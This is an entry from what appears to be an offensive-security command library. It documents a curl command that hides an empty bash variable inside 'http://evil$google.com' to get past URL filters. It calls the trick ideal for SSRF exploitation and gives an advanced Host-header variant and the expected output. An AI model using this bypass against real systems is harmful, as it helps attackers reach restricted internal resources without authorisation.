---
id: 8e1f7a24-0510-4e9c-a17d-8b8ed8abc9a4
name: curl-verbose-with-variable-url
type: command
executor: bash
data: 'curl -v "http://evil$google.com"'
output: null
created_at: '2023-04-06T03:56:37.506243+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - curl
  - ssrf
  - verbose
  - bypass
verified: true
validated: true
---

# curl-verbose-with-variable-url

## Command

```bash
curl -v "http://evil$google.com"
```

## Description

This command uses curl in verbose mode (-v) to send an HTTP request to a URL containing a bash variable ($google). When $google is empty, the URL expands to 'http://evil.com', bypassing filters that block direct access to that domain. Ideal for SSRF exploitation to access restricted internal resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Enables verbose output, showing headers and connection details | Yes |
| `"http://evil$google.com"` | URL with embedded variable; customize 'evil' and variable as needed | Yes |
| `$google` | Pre-set bash variable (must be empty for bypass) | Yes (pre-defined) |

## Examples

### Basic Usage

```bash
curl -v "http://evil$google.com"
```

### Advanced Usage

```bash
curl -v "https://internal$var.service.com" --header "Host: bypassed"
```

(Add headers or HTTPS for more complex SSRF scenarios.)

## Expected Output

Verbose details including:
* Connected to evil.com (IP) port 80
* > GET / HTTP/1.1
* < HTTP/1.1 200 OK
* Response body content if access granted.

If bypassed successfully, expect full resource data; else, connection refused or timeout.

## Related

- [[procedures/Bypass-SSRF-Filters-Using-Bash-Variables-and-Curl-Verbose]]
- [[commands/bash-assign-empty-variable]]
